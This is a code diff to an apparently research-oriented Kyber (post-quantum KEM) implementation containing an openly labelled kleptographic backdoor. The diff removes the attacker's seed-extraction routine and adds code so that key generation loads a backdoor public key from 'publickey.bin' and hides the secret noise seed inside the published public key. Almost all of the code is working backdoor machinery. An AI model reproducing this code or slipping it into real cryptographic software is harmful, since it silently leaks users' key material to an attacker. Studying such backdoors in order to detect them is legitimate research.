@@ -17,7 +17,7 @@
 #include <time.h>
 #include "ecdh.h"
 
-#include "gcm.h"    // define the various AES-GCM library functions
+#include "gcm.h" 
 #include "klepto_attack.h"
 
 uint8_t global_noise_seed[KYBER_SYMBYTES];
@@ -31,25 +31,21 @@ static uint8_t prv_keygen[ECC_PRV_KEY_SIZE];
 
 
 uint8_t pk_cm[crypto_kem_PUBLICKEYBYTES];
-uint8_t sk_cm[crypto_kem_SECRETKEYBYTES];
 uint8_t ct_cm[crypto_kem_CIPHERTEXTBYTES];
 
 #if (PRE_OR_POST_QUANTUM_BACKDOOR == 1)
 
 uint8_t sec_keygen[crypto_kem_BYTES];
-uint8_t sec_klepto[crypto_kem_BYTES];
 
 #else
 
 static uint8_t sec_keygen[ECC_PUB_KEY_SIZE];
-static uint8_t sec_klepto[ECC_PUB_KEY_SIZE];
 
 #endif
 
 uint8_t pk_snooped_by_attacker[KYBER_INDCPA_PUBLICKEYBYTES];
-uint8_t ct_snooped_by_attacker[KYBER_INDCPA_BYTES];
 int klepto_data_to_send_len_global;
-size_t key_len_global, iv_len_global, aad_len_global, pt_len_global, ct_len_global, tag_len_global;
+size_t key_len_global = 32, iv_len_global = 1, aad_len_global = 0, pt_len_global = 32, ct_len_global = 32, tag_len_global = 16;
 
 /* pseudo random number generator with 128 bit internal state... probably not suited for cryptographical usage */
 typedef struct
@@ -114,6 +110,20 @@ static int get_random(void)
     shift_lfsr(&lfsr_2, POLY_MASK_HERE_2);
     temp = (shift_lfsr(&lfsr_1, POLY_MASK_HERE_1) ^ shift_lfsr(&lfsr_2, POLY_MASK_HERE_2)) & 0XFF;
     return (temp);
+}
+
+void read_key_from_file(const char *filename, uint8_t *key, size_t len) {
+    FILE *file = fopen(filename, "rb");
+    if (file == NULL) {
+        fprintf(stderr, "Failed to open file %s for reading\n", filename);
+        exit(EXIT_FAILURE);
+    }
+    size_t read = fread(key, sizeof(uint8_t), len, file);
+    if (read != len) {
+        fprintf(stderr, "Failed to read the complete key from file %s\n", filename);
+        exit(EXIT_FAILURE);
+    }
+    fclose(file);
 }
 
 
@@ -483,175 +493,6 @@ static int add_klepto_data(polyvec *pkpv, uint8_t *klepto_data, int klepto_data_
   }
 }
 
-void klepto_keygen_attacker_function(int mode)
-{
-
-  uint8_t seed[KYBER_SYMBYTES];
-  polyvec pkpv_polyvec;
-  polyvec one_matrix[KYBER_K];
-  polyvec pkpv_temp;
-  int i;
-
-  uint16_t u_decompressed_coeffs[KYBER_K*KYBER_N];
-
-// BACKDOOR INSTALLATION precedure, generate pk_bd and sk_bd 
-  if(mode == 0)
-  {
-
-    key_len_global = 32;
-    iv_len_global = 1;
-    aad_len_global = 0;
-    pt_len_global = 32;
-    ct_len_global = 32;
-    tag_len_global = 16;
-
-
-    #if (PRE_OR_POST_QUANTUM_BACKDOOR == 1)
-
-    cm_crypto_kem_keypair(pk_cm, sk_cm);
-
-    #else
-
-    // Generate ECDH key...
-    generate_ecdh_keypair(pub_ecdh_attacker, prv_ecdh_attacker);
-
-    #endif
-
-  }
-
-  else if(mode == 1)
-  {
-
-    // Here attacker has to use the public key to extract the ecc ciphertext and the ECC public key...
-
-    unpack_pk(&pkpv_polyvec, seed, pk_snooped_by_attacker);
-
-    for(int ii = 0; ii < KYBER_K; ii++)
-    {
-      for(int jj = 0; jj < KYBER_K; jj++)
-      {
-        for(int kk = 0; kk < KYBER_N; kk++)
-        {
-          if((ii == jj) && (kk%2) == 0)
-            one_matrix[ii].vec[jj].coeffs[kk] = 1;
-          else
-            one_matrix[ii].vec[jj].coeffs[kk] = 0;
-        }
-      }
-    }
-
-
-    for(i=0;i<KYBER_K;i++)
-      polyvec_basemul_acc_montgomery(&pkpv_temp.vec[i], &pkpv_polyvec, &(one_matrix[i]));
-
-    polyvec_invntt_tomont(&pkpv_temp);
-
-    int value_now, mod_value_now;
-    int current_coeff_pos;
-    int bit_pos, byte_pos;
-
-    uchar *klepto_data_in_attacker;
-    klepto_data_in_attacker = (uchar *) malloc(klepto_data_to_send_len_global);
-
-    for(int kk = 0; kk < klepto_data_to_send_len_global; kk++)
-    {
-      klepto_data_in_attacker[kk] = 0x00;
-    }
-
-    uint8_t klepto_data_in_attacker_in_bits[klepto_data_to_send_len_global*8];
-
-    for(int ii = 0; ii < KYBER_K; ii++)
-    {
-      for(int jj = 0; jj < KYBER_N; jj++)
-      {
-        current_coeff_pos = KYBER_N*ii+jj;
-        byte_pos = (int)(current_coeff_pos*(KLEPTO_BITS_PER_COEFF)/8);
-        bit_pos = (current_coeff_pos*KLEPTO_BITS_PER_COEFF)%8;
-
-        if((current_coeff_pos*KLEPTO_BITS_PER_COEFF) < (klepto_data_to_send_len_global*8))
-        {
-          if(pkpv_temp.vec[ii].coeffs[jj] < 0)
-            value_now = pkpv_temp.vec[ii].coeffs[jj] + KYBER_Q;
-          else
-            value_now = pkpv_temp.vec[ii].coeffs[jj];
-
-          mod_value_now = value_now % (1 << KLEPTO_BITS_PER_COEFF);
-
-          int bittt;
-          for(int klk = 0; klk < KLEPTO_BITS_PER_COEFF; klk++)
-            klepto_data_in_attacker_in_bits[current_coeff_pos*KLEPTO_BITS_PER_COEFF + klk] = (mod_value_now >> klk)&0x1;
-
-        }
-      }
-    }
-
-    for(int klk = 0; klk < klepto_data_to_send_len_global; klk++)
-    {
-      int bytte_now = 0;
-      for(int qwq = 0; qwq < 8; qwq++)
-        bytte_now = bytte_now | ((klepto_data_in_attacker_in_bits[klk*8+qwq]) << qwq);
-
-      klepto_data_in_attacker[klk] = bytte_now;
-    }
-
-
-
-    #if (PRE_OR_POST_QUANTUM_BACKDOOR == 1)
-
-    for(int kk = 0; kk < crypto_kem_CIPHERTEXTBYTES; kk++)
-    {
-      ct_cm[kk] = *(klepto_data_in_attacker + kk);
-    }
-
-    cm_crypto_kem_dec(sec_klepto, ct_cm, sk_cm);  // Dec_bd(sk_bd, ct_bd)
-
-    #else
-
-    uint8_t ecc_public_key_klepto[ECC_PUB_KEY_SIZE];
-
-    for(int kk = 0; kk < ECC_PUB_KEY_SIZE; kk++)
-    {
-      ecc_public_key_klepto[kk] = *(klepto_data_in_attacker + kk);
-    }
-
-    // Get the Public key and extract the information from this...
-
-    ecdh_shared_secret(prv_ecdh_attacker, ecc_public_key_klepto, sec_klepto);
-
-
-    #endif
-
-    uint8_t extracted_noise_seed[KYBER_SYMBYTES];
-
-    for(int kk = 0; kk < KYBER_SYMBYTES; kk++)
-      *(extracted_noise_seed + kk) = *(sec_klepto + kk);
-
-    int same_count = 0;
-
-    for(int jj = 0; jj < KYBER_SYMBYTES; jj++)
-    {
-      if(*(extracted_noise_seed+jj) == *(global_noise_seed + jj))
-      {
-        same_count = same_count + 1;
-      }
-    }
-
-    if(same_count == KYBER_SYMBYTES)
-    {
-      #if (DEBUG_PRINT == 1)
-        printf("Attack Success...\n");
-      #endif
-    }
-    else
-    {
-      printf("Attack Failure...\n");
-    }
-
-  }
-
-
-}
-
 void klepto_attack_public_key(polyvec *pkpv, uint8_t *noiseseed)
 {
     polyvec one_matrix[KYBER_K];
@@ -714,7 +555,6 @@ void klepto_attack_public_key(polyvec *pkpv, uint8_t *noiseseed)
         pkpv->vec[ii].coeffs[jj] = pkpv_temp.vec[ii].coeffs[jj];
       }
     }
-
 }
 
 
@@ -730,6 +570,8 @@ void indcpa_keypair(uint8_t pk[KYBER_INDCPA_PUBLICKEYBYTES],
 
   // Now, we have seca secret... We can use the secret key to encrypt information...
   // We need to encrypt the noiseseed...
+
+  read_key_from_file("publickey.bin", pk_cm, crypto_kem_PUBLICKEYBYTES);
 
   #if (PRE_OR_POST_QUANTUM_BACKDOOR == 1)
 
